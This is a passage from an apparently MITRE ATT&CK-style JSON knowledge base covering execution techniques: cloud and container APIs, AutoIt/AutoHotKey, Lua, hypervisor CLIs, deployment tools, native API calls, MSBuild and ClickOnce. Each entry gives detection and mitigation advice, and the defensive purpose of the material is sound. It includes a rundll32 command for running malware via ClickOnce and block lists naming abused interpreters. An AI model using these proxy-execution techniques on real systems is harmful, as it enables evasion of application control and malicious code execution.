href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#38\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - AAA)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"},{"id":"M1038","name":"Execution Prevention","description":"TACACS+ can keep control over which commands administrators are permitted to use through the configuration of authentication and command authorization. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"}]},{"id":"T1059.009","name":"Cloud API","description":"Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell <a href=\"https://github.com/Azure/azure-powershell\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Azure PowerShell)</a>, or software developer kits (SDKs) available for languages such as Python.  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as Application Access Token and Web Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.","detection":"","platforms":["IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["Command: Command Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Use of proper Identity and Access Management (IAM) with Role Based Access Control (RBAC) policies to limit actions administrators can perform and provide a history of administrative actions to detect unauthorized use and abuse."},{"id":"M1038","name":"Execution Prevention","description":"Use application control where appropriate to block use of PowerShell CmdLets or other host based resources to access cloud API resources."}]},{"id":"T1059.010","name":"AutoHotKey & AutoIT","description":"Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs. <a href=\"https://www.autoitscript.com/autoit3/docs/intro/running.htm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AutoIT)</a> <a href=\"https://www.autohotkey.com/docs/v1/Program.htm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AutoHotKey)</a>\n\nAdversaries may use AHK (<code>.ahk</code>) and AutoIT (<code>.au3</code>) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as Phishing payloads. <a href=\"https://www.splunk.com/en_us/blog/security/enter-the-gates-an-analysis-of-the-darkgate-autoit-loader.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Splunk DarkGate)</a>\n\nThese scripts may also be compiled into self-contained executable payloads (<code>.exe</code>). <a href=\"https://www.autoitscript.com/autoit3/docs/intro/running.htm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AutoIT)</a> <a href=\"https://www.autohotkey.com/docs/v1/Program.htm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AutoHotKey)</a>","detection":"","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control to prevent execution of <code>AutoIt3.exe</code>, <code>AutoHotkey.exe</code>, and other related features that may not be required for a given system or network to prevent potential misuse by adversaries."}]},{"id":"T1059.011","name":"Lua","description":"Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (<code>.lua</code>), or from Lua-embedded programs (through the <code>struct lua_State</code>). <a href=\"https://www.lua.org/start.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lua main page)</a> <a href=\"https://pgl.yoyo.org/luai/i/lua_State\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lua state)</a>\n\nLua scripts may be executed by adversaries for malicious purposes. Adversaries may incorporate, abuse, or replace existing Lua interpreters to allow for malicious Lua command execution at runtime. <a href=\"https://blog.talosintelligence.com/poetrat-update/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PoetRat Lua)</a> <a href=\"https://www.proofpoint.com/us/blog/threat-insight/asylum-ambuscade-state-actor-uses-compromised-private-ukrainian-military-emails\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lua Proofpoint Sunseed)</a> <a href=\"https://web.archive.org/web/20150311013500/http:/www.cyphort.com/evilbunny-malware-instrumented-lua/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyphort EvilBunny)</a> <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07190154/The-ProjectSauron-APT_research_KL.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Lua)</a>","detection":"","platforms":["Linux","Network Devices","Windows","macOS"],"dataSources":["Command: Command Execution","Script: Script Execution"],"mitigations":[{"id":"M1033","name":"Limit Software Installation","description":"Prevent users from installing Lua where not required."},{"id":"M1038","name":"Execution Prevention","description":"Denylist Lua interpreters where appropriate."},{"id":"M1047","name":"Audit","description":"Inventory systems for unauthorized Lua installations."}]},{"id":"T1059.012","name":"Hypervisor CLI","description":"Adversaries may abuse hypervisor command line interpreters (CLIs) to execute malicious commands. Hypervisor CLIs typically enable a wide variety of functionality for managing both the hypervisor itself and the guest virtual machines it hosts. \n\nFor example, on ESXi systems, tools such as <code>esxcli</code> and <code>vim-cmd</code> allow administrators to configure firewall rules and log forwarding on the hypervisor, list virtual machines, start and stop virtual machines, and more. <a href=\"https://developer.broadcom.com/xapis/esxcli-command-reference/latest/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom ESXCLI Reference)</a> <a href=\"https://www.crowdstrike.com/en-us/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)</a> <a href=\"https://lolesxi-project.github.io/LOLESXi/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLESXi)</a> Adversaries may be able to leverage these tools in order to support further actions, such as File and Directory Discovery or Data Encrypted for Impact.","detection":"","platforms":["ESXi"],"dataSources":[],"mitigations":[]},{"id":"T1059.013","name":"Container CLI/API","description":"Adversaries may abuse built-in CLI tools or API calls to execute malicious commands in containerized environments.\n\nThe Docker CLI is used for managing containers via an exposed API point from the <code>dockerd</code> daemon. Some common examples of Docker CLI include Docker Desktop CLI and Docker Compose, but users are also able to use SDKs to interact with the API. For example, Docker SDK for Python can be used to run commands within a Python application. <a href=\"https://docs.docker.com/desktop/features/desktop-cli/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Desktop CLI)</a>\n\nAdversaries may leverage the Docker CLI, API, or SDK to pull or build Docker images (i.e., Ingress Tool Transfer, Build Image on Host), run containers (i.e., Deploy Container), or execute commands inside running containers (i.e., Container Administration Command). In some cases, threat actors may pull legitimate images that include scripts or tools that they can leverage - for example, using an image that includes the <code>curl</code> command to download payloads. <a href=\"https://intezer.com/blog/watch-your-containers-doki-infecting-docker-servers-in-the-cloud/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer)</a> Adversaries may also utilize <code>docker inspect</code> and <code>docker ps</code> to scan for cloud environment variables and other running containers (i.e., Container and Resource Discovery). <a href=\"https://blog.talosintelligence.com/teamtnt-targeting-aws-alibaba-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Talos Blog)</a> <a href=\"https://www.aquasec.com/blog/teamtnt-reemerged-with-new-aggressive-cloud-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: aquasec)</a>\n\nKubernetes is responsible for the management and orchestration of containers across clusters. The Kubernetes control plane, which manages the state of the cluster and is responsible for scheduling, communication, and resource monitoring, can be invoked directly via the API or indirectly via CLI tools such as <code>kubectl</code>. It may also be accessed within client libraries such as Go or Python. By utilizing the API, administrators can interact with resources within the cluster such as listing or creating pods, which is a group of one or more containers. Adversaries call the API server via <code>curl</code> or other tools, allowing them to obtain further information about the environment such as pods, deployments, daemonsets, namespaces, or sysvars. <a href=\"https://www.aquasec.com/blog/teamtnt-reemerged-with-new-aggressive-cloud-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: aquasec)</a> They may also run various commands regarding resource management.","detection":"","platforms":["Containers"],"dataSources":[],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict permissions on API access. RBAC in Kubernetes involve permissions that are additive, meaning there are no explicit \"deny\" rules. These permissions can be defined within a particular namespace or within cluster-scoped resources. Securing the Docker daemon can be done by using SSH or TLS with certificate authorization. Container management tools such as Docker and Podman may offer ways to run containers as rootless, which prevents them from running with privileged permissions."},{"id":"M1038","name":"Execution Prevention","description":"Deny scripting where appropriate. Tools such as Python or Go can utilize Kubernetes and Docker within a client library and execute commands within their application."}]}]},{"id":"T1072","name":"Software Deployment Tools","description":"Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad Cloud Administration Command on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID. <a href=\"https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020)</a> Such services may also utilize Web Protocols to communicate back to adversary owned infrastructure. <a href=\"https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)</a>\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries. <a href=\"https://www.mandiant.com/resources/blog/fortinet-malware-ecosystem\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)</a>\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.","detection":"Detection methods will vary depending on the type of third-party software or system and how it is typically used. \n\nThe same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. \n\nOften these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.\n\nPerform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.","platforms":["Linux","macOS","Network Devices","SaaS","Windows"],"dataSources":["Process: Process Creation","Application Log: Application Log Content"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Ensure proper system and access isolation for critical network systems through use of group policy."},{"id":"M1017","name":"User Training","description":"Have a strict approval policy for use of deployment systems."},{"id":"M1018","name":"User Account Management","description":"Ensure that any accounts used by third-party providers to access these systems are traceable to the third-party and are not used throughout the network or used by other third-party providers in the same environment. Ensure there are regular reviews of accounts provisioned to these systems to verify continued business need, and ensure there is governance to trace de-provisioning of access that is no longer required. Ensure proper system and access isolation for critical network systems through use of account privilege separation."},{"id":"M1026","name":"Privileged Account Management","description":"Grant access to application deployment systems only to a limited number of authorized administrators."},{"id":"M1027","name":"Password Policies","description":"Verify that account credentials that may be used to access deployment systems are unique and not used throughout the enterprise network."},{"id":"M1029","name":"Remote Data Storage","description":"If the application deployment system can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the application deployment system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled."},{"id":"M1030","name":"Network Segmentation","description":"Ensure proper system isolation for critical network systems through use of firewalls."},{"id":"M1032","name":"Multi-factor Authentication","description":"Ensure proper system and access isolation for critical network systems through use of multi-factor authentication."},{"id":"M1033","name":"Limit Software Installation","description":"Restrict the use of third-party software suites installed within an enterprise network."},{"id":"M1051","name":"Update Software","description":"Patch deployment systems regularly to prevent potential remote access through Exploitation for Privilege Escalation."}],"subTechniques":[]},{"id":"T1106","name":"Native API","description":"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. <a href=\"https://undocumented.ntinternals.net/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NT API Windows)</a> <a href=\"https://www.kernel.org/doc/html/v4.12/core-api/kernel-api.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Kernel API)</a> These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. <a href=\"https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OutFlank System Calls)</a> <a href=\"https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CyberBit System Calls)</a> <a href=\"https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MDSec System Calls)</a> For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://www.gnu.org/software/libc/manual/html_node/Creating-a-Process.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GNU Fork)</a> This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations. <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Win32)</a> <a href=\"https://man7.org/linux/man-pages//man7/libc.7.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LIBC)</a> <a href=\"https://www.gnu.org/software/libc/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GLIBC)</a>\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code. <a href=\"https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet-framework\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft NET)</a> <a href=\"https://developer.apple.com/documentation/coreservices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Core Services)</a> <a href=\"https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/OSX_Technology_Overview/CocoaApplicationLayer/CocoaApplicationLayer.html#//apple_ref/doc/uid/TP40001067-CH274-SW1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MACOS Cocoa)</a> <a href=\"https://developer.apple.com/documentation/foundation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: macOS Foundation)</a>\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. <a href=\"https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Redops Syscalls)</a> Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.","detection":"Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and may be difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \n\nUtilization of the Windows APIs may involve processes loading/accessing system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","Module: Module Load"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Identify and block potentially malicious software executed that may be executed through this technique by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools, like Windows Defender Application Control <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a>, AppLocker, <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> or Software Restriction Policies <a href=\"http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corio 2008)</a> where appropriate. <a href=\"https://technet.microsoft.com/en-us/library/ee791851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Applocker vs SRP)</a>"},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office VBA macros from calling Win32 APIs. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}],"subTechniques":[]},{"id":"T1127","name":"Trusted Developer Utilities Proxy Execution","description":"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. <a href=\"https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: engima0x3 DNX Bypass)</a> <a href=\"https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: engima0x3 RCSI Bypass)</a> <a href=\"http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Exploit Monday WinDbg)</a> <a href=\"https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Tracker)</a> These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.\n\nSmart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them. <a href=\"https://support.microsoft.com/en-us/windows/smart-app-control-frequently-asked-questions-285ea03d-fa88-4d56-882e-6698afdb7003\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Smart App Control)</a> However, adversaries may leverage \"reputation hijacking\" to abuse an operating system’s trust of safe, signed applications that support the execution of arbitrary code. By leveraging Trusted Developer Utilities Proxy Execution to run their malicious code, adversaries may bypass Smart App Control protections. <a href=\"https://www.elastic.co/security-labs/dismantling-smart-app-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Security Labs)</a>","detection":"Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.","platforms":["Windows"],"dataSources":["Command: Command Execution","Module: Module Load","Process: Process Metadata","Process: Process Creation"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Consider disabling software installation or execution from the internet via developer utilities."},{"id":"M1038","name":"Execution Prevention","description":"Certain developer utilities should be blocked or restricted if not required."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Specific developer utilities may not be necessary within a given environment and should be removed if not used."}],"subTechniques":[{"id":"T1127.001","name":"MSBuild","description":"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations. <a href=\"https://msdn.microsoft.com/library/dd393574.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN MSBuild)</a>\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file. <a href=\"https://msdn.microsoft.com/library/dd393574.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN MSBuild)</a> <a href=\"https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-inline-tasks?view=vs-2019#code-element\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft MSBuild Inline Tasks 2017)</a> MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Msbuild/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS Msbuild)</a>","detection":"Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Use application control configured to block execution of <code>msbuild.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>msbuild.exe</code> application and to prevent abuse. <a href=\"https://docs.microsoft.com/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WDAC)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"MSBuild.exe may not be necessary within an environment and should be removed if not being used."}]},{"id":"T1127.002","name":"ClickOnce","description":"Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility. <a href=\"https://i.blackhat.com/USA-19/Wednesday/us-19-Burke-ClickOnce-And-Youre-In-When-Appref-Ms-Abuse-Is-Operating-As-Intended.pdf?_gl=1*16njas6*_gcl_au*NjAyMzkzMjc3LjE3MjQ4MDk4OTQ.*_ga*MTk5OTA3ODkwMC4xNzI0ODA5ODk0*_ga_K4JK67TFYV*MTcyNDgwOTg5NC4xLjEuMTcyNDgwOTk1Ny4wLjAuMA..&_ga=2.253743689.1512103758.1724809895-1999078900.1724809894\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Burke/CISA ClickOnce BlackHat)</a> ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application. <a href=\"https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Medium ClickOnce)</a>\n\nBecause ClickOnce applications receive only limited permissions, they do not require administrative permissions to install. <a href=\"https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-security-and-deployment?view=vs-2022\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Learn ClickOnce)</a> As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.\n\nClickOnce may be abused in a number of ways. For example, an adversary may rely on User Execution. When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation. <a href=\"https://www.netspi.com/blog/technical-blog/adversary-simulation/all-you-need-is-one-a-clickonce-love-story/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NetSPI ClickOnce)</a>\n\nAdversaries may also abuse ClickOnce to execute malware via a Rundll32 script using the command <code>rundll32.exe dfshim.dll,ShOpenVerbApplication1</code>. <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Dfsvc/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LOLBAS /Dfsvc.exe)</a>\n\nAdditionally, an adversary can move the ClickOnce application file to a remote user’s startup folder for continued malicious code deployment (i.e., Registry Run Keys / Startup Folder). <a href=\"https://i.blackhat.com/USA-19/Wednesday/us-19-Burke-ClickOnce-And-Youre-In-When-Appref-Ms-Abuse-Is-Operating-As-Intended.pdf?_gl=1*16njas6*_gcl_au*NjAyMzkzMjc3LjE3MjQ4MDk4OTQ.*_ga*MTk5OTA3ODkwMC4xNzI0ODA5ODk0*_ga_K4JK67TFYV*MTcyNDgwOTg5NC4xLjEuMTcyNDgwOTk1Ny4wLjAuMA..&_ga=2.253743689.1512103758.1724809895-1999078900.1724809894\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Burke/CISA ClickOnce BlackHat)</a> <a href=\"https://i.blackhat.com/USA-19/Wednesday/us-19-Burke-ClickOnce-And-Youre-In-When-Appref-Ms-Abuse-Is-Operating-As-Intended-wp.pdf?_gl=1*1jv89bf*_gcl_au*NjAyMzkzMjc3LjE3MjQ4MDk4OTQ.*_ga*MTk5OTA3ODkwMC4xNzI0ODA5ODk0*_ga_K4JK67TFYV*MTcyNDgwOTg5NC4xLjEuMTcyNDgwOTk1Ny4wLjAuMA..&_ga=2.256219723.1512103758.1724809895-1999078900.1724809894\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Burke/CISA ClickOnce Paper)</a>","detection":"","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Process: Process Metadata","Module: Module Load"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Disable ClickOnce installations from the internet using the following registry key: \n<code>\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\Security\\TrustManager\\PromptingLevel — Internet:Disabled</code> <a href=\"https://www.netspi.com/blog/technical-blog/adversary-simulation/all-you-need-is-one-a-clickonce-love-story/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NetSPI ClickOnce)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable ClickOnce installations from the internet using the following registry key: \n<code>\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\Security\\TrustManager\\PromptingLevel — Internet:Disabled</code> <a href=\"https://www.netspi.com/blog/technical-blog/adversary-simulation/all-you-need-is-one-a-clickonce-love-story/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NetSPI ClickOnce)</a> <a href=\"https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior?view=vs-2022&tabs=csharp\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Learn ClickOnce Config)</a>\n\nClickOnce may not be necessary within an environment and should be disabled if not being used."},{"id":"M1045","name":"Code Signing","description":"Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing. <a href=\"https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-and-authenticode?view=vs-2022\" 